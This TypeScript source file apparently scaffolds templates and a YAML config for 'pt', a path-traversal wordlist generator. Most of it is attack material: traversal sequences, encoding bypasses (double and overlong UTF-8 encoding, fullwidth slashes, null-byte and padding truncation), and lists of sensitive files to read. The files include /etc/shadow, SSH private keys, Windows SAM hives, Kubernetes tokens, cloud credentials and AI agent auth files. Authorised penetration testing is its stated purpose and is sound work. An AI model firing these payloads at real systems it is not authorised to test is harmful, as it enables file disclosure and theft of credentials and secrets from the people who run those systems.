/**
 * Content written by `pt --generate-basic-config`.
 *
 * The goal is that on a clean machine
 *   pt --generate-basic-config ./pt.yml && pt --config ./pt.yml
 * works end to end with no further editing.
 *
 * ## Why the templates are in folders
 *
 * pt is not a fire-a-giant-wordlist tool. The workflow it exists for is:
 *
 *   recon the target's stack  ->  assemble a template matching that stack
 *                             ->  generate a focused wordlist
 *
 * So the seeds are split the same way the harvested corpus is -- one folder per
 * stack dimension -- and the scaffolded config reads from THREE of the five:
 * `linux`, `language` and `devops`. `windows` and `macos` are scaffolded too, and
 * are one commented-out block away, because which folders you read is exactly the
 * decision recon makes for you. Picking them is the point; a default that reads
 * all five would be the giant wordlist again.
 *
 * See `skills/path-traversal/SKILL.md` for the full workflow.
 */

// ---------------------------------------------------------------------------
// linux -- the residual OS category, and the default
// ---------------------------------------------------------------------------

const LINUX_TRAVERSAL_TXT = `# Traversal primitives for POSIX paths, one per line.
#
# All of these are normalised to TRAILING-separator form so that
#   prefix + traversal x repeat + target
# concatenates cleanly without ever needing a separator inserted.
#
# Every step here is '/'-class in some spelling. The '\\'-class primitives are in
# templates/windows/traversal.txt, because separator identity is the only
# dimension a traversal primitive differs in -- and the only reason to split
# them.
#
# These are the *literal* spellings you want on the wire regardless of strategy.
# Note that a few of them overlap with what the strategy layer can now derive
# ('..%2f' is 'url_encode:1' of '../', '..%c0%af' is 'overlong_utf8'); they are
# kept because a filter can treat a primitive that arrives pre-encoded in the
# traversal differently from one the whole payload was encoded with.
#
# 'pt --config ./pt.yml --dry-run' tells you per LINE what each one earns, so you
# can delete the ones that earn nothing on evidence rather than taste.
../
..%2f
..%252f
....//
..../
%2e%2e/
..%c0%af
..%ef%bc%8f
..;/
`

const LINUX_TARGET_TXT = `# Linux and UNIX targets: the files worth reading once traversal lands.
#
# This is the RESIDUAL OS category on purpose. A path that identifies a stack
# COMPONENT belongs in templates/devops/ or templates/language/ instead:
# /etc/nginx/nginx.conf tells you what you are talking to, /etc/passwd does not.
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/auth.log
/root/.bash_history
/root/.ssh/id_ed25519
/home/user/.ssh/id_rsa
`

const LINUX_PREFIX_TXT = `# POSIX document roots and separator padding to put in front of the traversal.
#
# A document root is the single most recon-dependent line in a whole config: it
# is the one thing you cannot infer from a response. Replace these with what you
# actually found.
/var/www/html/
///////
`

// ---------------------------------------------------------------------------
// language -- one file per runtime
// ---------------------------------------------------------------------------

const PHP_TARGET_TXT = `# PHP targets. Reach for this file when recon says PHP is executing the request:
# an X-Powered-By header, a .php extension, a PHPSESSID cookie, a stack trace.
/etc/php.ini
/etc/php/8.3/fpm/php.ini
/.htaccess
/composer.json
/wp-config.php
`

const JAVA_TARGET_TXT = `# Java / JVM web application targets. Reach for this file when recon says a
# servlet container: a JSESSIONID cookie, a .jsp or .do extension, a Tomcat or
# Jetty error page.
#
# The CONTAINER's own configuration (server.xml, tomcat-users.xml) is in
# templates/devops/target.txt instead -- that is infrastructure, this is the
# application deployed into it.
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/hibernate.cfg.xml
/META-INF/MANIFEST.MF
`

const LANGUAGE_SUFFIX_TXT = `# Appended after the target to defeat an extension check or truncate the path.
#
# Grouped under 'language' because that is the layer each trick lives at:
#
#   %00, %00.png   a C string ends at the null; PHP < 5.3.4 is the classic, and
#                  any runtime handing a path to a C API can be one
#   ?.png          truncation at the query string -- HTTP, not the runtime
#   ;.png          a servlet container strips ';...' from a path segment
#
# The suffix slot sets 'transform: false' in the generated config, so these stay
# literal while the traversal and target around them still get rewritten. The
# protection lives on the slot, next to nothing at all -- you read it in pt.yml
# one line above the file name, instead of in a separate path-keyed list.
#
# A leading '!' on a line FLIPS the slot's setting for that one line, so a suffix
# you do want rewritten can say so here. '!!' is a literal leading '!'.
#
# Note: '#' only starts a comment when followed by whitespace, another '#', or
# end of line, so '#.png' below needs no escaping.
%00.png
?.png
#.png
;.png
`

// ---------------------------------------------------------------------------
// devops -- the files that identify a stack component
// ---------------------------------------------------------------------------

const DEVOPS_TARGET_TXT = `# Infrastructure targets: the files that identify a STACK COMPONENT rather than
# an operating system. Web servers, application servers, containers and
# orchestration, infrastructure-as-code, CI/CD, cloud and agent credentials.
#
# This is why /etc/nginx/nginx.conf is here and /etc/passwd is in
# templates/linux/target.txt. The first one tells you what you are talking to.
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
/usr/local/tomcat/conf/tomcat-users.xml
/etc/docker/daemon.json
/.dockerenv
/proc/self/cgroup
/run/secrets/kubernetes.io/serviceaccount/token
/root/.kube/config
/root/.aws/credentials
/terraform.tfstate
/.env
/.git/config

# --- AI agent tooling (2025-2026) ---
# An .mcp.json or a ~/.codex/auth.json identifies the build-and-deploy toolchain
# the way a docker-compose.yml does, and what it leaks is credentials for
# everything else.
/.mcp.json
/root/.claude.json
/root/.codex/auth.json
/AGENTS.md
`

const DEVOPS_PREFIX_TXT = `# Document roots a web or application server maps, rather than a filesystem root.
# Replace these with the one recon actually found.
#
# The scaffolded config does NOT read this file: the prefix slot multiplies every
# other slot, so a second document root costs as much as doubling the target list.
# Uncomment it under 'slots:' once recon has told you which root is real -- or
# better, replace templates/linux/prefix.txt's entries with the one you found.
/usr/share/nginx/html/
/app/
/usr/src/app/
`

// ---------------------------------------------------------------------------
// windows and macos -- scaffolded, but NOT in the default config
// ---------------------------------------------------------------------------

const WINDOWS_TRAVERSAL_TXT = `# Traversal primitives carrying a '\\'-class separator, in several spellings.
#
# Not in the default config. Swap them in when recon says Windows -- see the
# comment block above 'slots:' in pt.yml.
..\\
..%5c
..%255c
....\\\\
..\\/
%2e%2e\\
`

const WINDOWS_TARGET_TXT = `# Windows targets: drive-letter paths, the registry hives, IIS.
#
# Not in the default config. A path lands here when it cannot resolve anywhere
# else -- an OS-rooted path beats a stack marker, so C:\\xampp\\php\\php.ini is a
# Windows target and not a PHP one.
/boot.ini
/windows/win.ini
C:\\boot.ini
C:\\windows\\win.ini
C:\\windows\\system32\\drivers\\etc\\hosts
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM
C:\\Windows\\repair\\SAM
C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
C:\\inetpub\\wwwroot\\web.config
C:\\Windows\\Panther\\unattend.xml
`

const WINDOWS_PREFIX_TXT = `# Win32 document roots and device/UNC preludes.
C:
C:\\inetpub\\wwwroot\\
\\\\localhost\\
\\\\?\\
`

const WINDOWS_SUFFIX_TXT = `# Win32 strips a trailing dot from the resolved name, so '/boot.ini.' opens
# '/boot.ini' while an extension check that ran earlier saw a different string.
#
# A single trailing dot and a trailing space are missing on purpose: pt trims
# every input line, so those two can only come from the 'trailing_dot' and
# 'trailing_space' strategies, both listed commented-out in pt.yml.
.......
`

const MACOS_TARGET_TXT = `# macOS targets: /System, /Library, /Users, /private, keychains, launchd, and
# the Homebrew prefix.
#
# Not in the default config. Note that macOS serves from /Library/WebServer and
# keeps its shadow file at /etc/master.passwd, so a Linux template misses both.
/etc/master.passwd
/private/etc/master.passwd
/private/etc/apache2/httpd.conf
/private/var/log/system.log
/Library/Keychains/System.keychain
/Library/LaunchDaemons
/Library/WebServer/Documents/.htaccess
/System/Library/CoreServices/SystemVersion.plist
/Users/Shared/.DS_Store
/Users/user/.zsh_history
/opt/homebrew/etc/nginx/nginx.conf
`

// ---------------------------------------------------------------------------
// Cross-category files, at the templates/ root
// ---------------------------------------------------------------------------

const RAW_TXT = `# Verbatim payloads.
#
# Lines in this file are emitted exactly as written: never decomposed into slots,
# never rewritten by a strategy, never repeat-multiplied. They exist for
# real-world wordlist entries that are internally inconsistent and so cannot be
# expressed generatively -- e.g. a half-encoded traversal whose last step is
# spelled differently from the rest.
#
# '--dry-run' prints the RAW RATIO: the size of this file against the generated
# part. That ratio is the measurement of how much of the real world pt's
# generative model does not capture.
#
# Note: '#' only starts a comment when followed by whitespace, another '#', or
# end of line, so a payload such as '#.png' needs no escaping.
..%c0%af..%c0%af..%c0%af..%c1%9cboot.ini
`

const TARGET_PADDING_TXT = `# Targets for the 'padding:2048' strategy.
#
# When the app does include($_GET['p'] . '.php'), the appended extension has to
# be truncated for the traversal to be useful. Padding the path past PHP's
# 4096-byte limit does that. Keep this list short: padding multiplies the length
# of every payload it touches, so it is worth only a handful of high-value files.
#
# Cross-category by construction -- it is a length attack, not a platform -- so
# it lives at the templates/ root rather than in one of the five folders.
/etc/passwd
/proc/self/environ
/.env
`

/** The config file written alongside the templates. */
export const CONFIG_YML = `# pt -- path traversal payload generator
#
# Mental model:
#   The SLOT FILES decide *which path* you are asking for.
#   The STRATEGIES decide *how that path is spelled on the wire*.
# No strategy reads a file; each is a rewrite applied after assembly.
#
# Run:  pt --config ./pt.yml        Count without writing:  pt --config ./pt.yml --dry-run
# Grow the corpus:  pt add --config ./pt.yml --slot traversal --value '..%c0%af'

# ============================================================================
# RECON FIRST. The template folders are the interface for it.
# ============================================================================
# ./templates is split by STACK DIMENSION, not by payload shape:
#
#   templates/windows/    Win32 paths, registry hives, IIS, UNC, '\\' primitives
#   templates/macos/      /System, /Library, /Users, keychains, launchd, Homebrew
#   templates/linux/      /etc, /proc, /var/log, /root, shells, SSH, POSIX
#   templates/language/   one file per runtime: PHP, Java, .NET, Python, Node, ...
#   templates/devops/     nginx, tomcat, k8s, docker, terraform, CI/CD, cloud, AI
#
# This config reads LINUX, LANGUAGE and DEVOPS, because that is the common stack
# and because a default has to pick something. It is a GUESS, and the whole point
# of the tool is to replace it with a measurement: fingerprint the stack first --
# Server and X-Powered-By headers, cookie names (PHPSESSID, JSESSIONID,
# connect.sid), extensions, error-page wording, favicon, TLS certificate names,
# 404 body, /robots.txt, response to '..;/' -- and then read only the folders that
# match.
#
# Windows and macOS are scaffolded next to the others and are not read. To switch:
#
#   Windows + IIS + .NET          Replace the linux files under 'slots:' with
#                                   prefix:    ./templates/windows/prefix.txt
#                                   traversal: ./templates/windows/traversal.txt
#                                   target:    ./templates/windows/target.txt
#                                              ./templates/language/target-dotnet.txt
#                                   suffix:    ./templates/windows/suffix.txt
#                                 (the scaffold writes no target-dotnet.txt; add
#                                  the one from the repo's templates/language/,
#                                  or start it with 'pt add')
#
#   macOS                         target: ./templates/macos/target.txt, and KEEP
#                                 the linux traversal -- macOS is POSIX.
#
#   Both, in one run              Add them as extra files on the target slot.
#                                 Cheaper: add one strategy line instead, so the
#                                 big list is not crossed with everything:
#                                   - "plain | target=./templates/windows/target.txt"
#
# Narrowing works the same way. A Tomcat target that is plainly not PHP wants
# templates/language/target-java.txt and not target-php.txt, and dropping the
# PHP file is a smaller wordlist for the same chance of a hit.

# --- slots ------------------------------------------------------------------
# An ORDERED LIST of positions. A payload is one member of each slot, in this
# order, concatenated. Files within one slot are UNIONed, not cross-producted --
# which is exactly how a category is added or removed.
# Lines are trimmed; blank lines and '# ' comments are skipped ('#.png' is a
# payload). A leading '!' on a line flips that line's 'transform'; '!!' is a
# literal '!'.
#
# Per-slot properties, all optional:
#   optional: true            give this slot an empty member, so payloads without
#                             it are generated too
#   repeat: [3, 6, 10, 16]    repeat this slot's text that many times, one payload
#                             per rung
#   transform: false          no strategy may rewrite these bytes (PER SEGMENT:
#                             a payload holding a literal suffix still gets its
#                             traversal and target rewritten)
#   strip_leading_separator:  never | when_same_separator | when_preceded
#                             'when_same_separator' is the default and drops this
#                             slot's leading separator only when the separator in
#                             front of it spells THE SAME separator. That is why
#                             '../' + '/etc/passwd' is '../../../etc/passwd'
#                             while '..\\\\' + '/etc/passwd' keeps both and is
#                             '..\\\\..\\\\..\\\\/etc/passwd' -- two different
#                             separators, both meaningful.
#
# Slots are ordered and named by you, so a second traversal position, or a slot
# between target and suffix, is just another entry in this list.
slots:
  # A prefix multiplies every other slot, so it is the one place where adding a
  # file is expensive. ./templates/devops/prefix.txt is scaffolded and left out
  # for that reason; name it here once recon says which document root is real.
  - name: prefix
    files:
      - ./templates/linux/prefix.txt
      # - ./templates/devops/prefix.txt
    optional: true

  # How many times the traversal repeats. Root clamping means overshooting is
  # free at the filesystem layer, so this is a sparse ladder, not a dense range:
  # extra rungs only exist to survive filters that strip or collapse sequences,
  # and length limits that reject the long ones.
  - name: traversal
    files: [./templates/linux/traversal.txt]
    optional: true
    repeat: [3, 6, 10, 16]

  # The one REQUIRED slot: no 'optional', so every payload has a target. At least
  # one slot must be required, and 'trailing_dot' appends to the last required
  # one, which is what keeps the dot on the path instead of after a '%00.png'.
  #
  # THREE categories unioned. Delete a line and the wordlist shrinks by exactly
  # that category; add one and it grows by exactly that category.
  - name: target
    files:
      - ./templates/linux/target.txt
      - ./templates/language/target-php.txt
      - ./templates/language/target-java.txt
      - ./templates/devops/target.txt
    strip_leading_separator: when_same_separator

  - name: suffix
    files: [./templates/language/suffix.txt]
    optional: true
    transform: false

# Emitted verbatim: never decomposed, transformed or repeat-multiplied.
# For real-world entries that are internally inconsistent and cannot be generated.
raw_file:
  - ./templates/raw.txt

# --- strategies -------------------------------------------------------------
# An ordered UNION of pipelines -- NOT a cross-product. Each entry is one
# hypothesis about where the filter sits; they are alternatives, not ingredients.
# Combining them multiplicatively would test conjunctions that are strictly less
# likely than their parts, which is pure wordlist bloat.
#
# Order is priority: Caido fires top-down, so put the likely ones first.
# Compose explicitly with '>' when you actually want a composition.
#
# Every entry is a SCALAR STRING. Two pieces of syntax:
#   stage arguments    url_encode:1(charset="+/=")   per STAGE, not per pipeline
#   slot overrides     plain | target=./other.txt, traversal.repeat=3
# ':' always means INTENSITY (url_encode:1|2|3, padding:N); techniques that are
# genuinely different have different names.
strategies:
  - plain                              # always first; most likely to just work
  - dot_noise                          # /./ -- beats sequence-matching filters
  - url_encode:1                       # filter checks before one decode
  - url_encode:1 > hex_case_upper      # %2F -- same byte, misses a lowercase blocklist
  - url_encode:2                       # two decodes after the check
  - overlong_utf8                      # %c0%af -- strict/lax decoder mismatch
  - fullwidth                          # %ef%bc%8f -- NFKC folds to '/' after the check
  - selective_last                     # beats "decode once, then check"
  - base64                             # app base64-decodes the parameter
  - 'base64 > url_encode:1(charset="+/=")'   # keep the blob intact in transit

  # --- available, off by default --------------------------------------------
  # Uncomment deliberately; run --dry-run first to see the cost.
  # - url_encode:3                     # layered gateways; rare
  # - overlong_utf8(+dots)             # also %c0%ae, so even '..' leaves the wire
  # - double_slash                     # //
  # - backtrack                        # /zz/../ -- decoy directory
  # - matrix_param                     # ;a=b/ -- Tomcat strips these
  # - selective_first
  # - selective_alternating
  # - utf16_escape                     # %u2215 -- IIS resolves %uXXXX, the filter has no rule for it
  # - 'utf16_escape(codepoint="2044")' # same bet on U+2044 FRACTION SLASH
  # - double_percent                   # %%32%66 -- double-encoded without a '%25' to match on
  # - path_case_upper                  # case-insensitive FS, case-sensitive filter
  # - trailing_dot                     # Win32 strips a trailing '.'
  # - trailing_space
  # - url_encode:1(charset=".")        # %2e%2e/ -- dots encoded, separators literal
  # - 'padding:2048 | target=./templates/target-padding.txt, traversal.repeat=3'
  #     # pads past PHP's 4096-byte path limit to truncate an appended extension.
  #     # The slot overrides keep it from inheriting every repeat rung and target.
  #
  # Stack-specific additions, for when recon says so. A strategy line is the
  # cheap way to add a category: it does not multiply the existing matrix.
  # - "plain | target=./templates/windows/target.txt, traversal=./templates/windows/traversal.txt"
  # - "plain | target=./templates/macos/target.txt"

# Characters percent-encoded by url_encode stages that do not set their own
# 'charset=' argument.
url_encode_charset: "./\\\\"

# --- output -----------------------------------------------------------------
output_file: ./wordlist/pt_wordlist.txt
overwrite_output_file: true

# --- limits -----------------------------------------------------------------
limits:
  warn_above: 200000      # print a warning and the contribution report
  max_payloads: 500000    # hard stop; raise deliberately
`

export interface SeedFile {
  /** Path relative to the directory the config file is written to. */
  readonly path: string
  readonly contents: string
}

/**
 * The five folders plus the two cross-category files.
 *
 * `windows/` and `macos/` are written even though the scaffolded config does not
 * read them, so the switch documented in that config's comments works without a
 * trip back to the repo.
 */
export const SEED_TEMPLATES: ReadonlyArray<SeedFile> = [
  { path: "templates/linux/prefix.txt", contents: LINUX_PREFIX_TXT },
  { path: "templates/linux/traversal.txt", contents: LINUX_TRAVERSAL_TXT },
  { path: "templates/linux/target.txt", contents: LINUX_TARGET_TXT },
  { path: "templates/language/target-php.txt", contents: PHP_TARGET_TXT },
  { path: "templates/language/target-java.txt", contents: JAVA_TARGET_TXT },
  { path: "templates/language/suffix.txt", contents: LANGUAGE_SUFFIX_TXT },
  { path: "templates/devops/target.txt", contents: DEVOPS_TARGET_TXT },
  { path: "templates/devops/prefix.txt", contents: DEVOPS_PREFIX_TXT },
  { path: "templates/windows/prefix.txt", contents: WINDOWS_PREFIX_TXT },
  { path: "templates/windows/traversal.txt", contents: WINDOWS_TRAVERSAL_TXT },
  { path: "templates/windows/target.txt", contents: WINDOWS_TARGET_TXT },
  { path: "templates/windows/suffix.txt", contents: WINDOWS_SUFFIX_TXT },
  { path: "templates/macos/target.txt", contents: MACOS_TARGET_TXT },
  { path: "templates/raw.txt", contents: RAW_TXT },
  { path: "templates/target-padding.txt", contents: TARGET_PADDING_TXT }
]
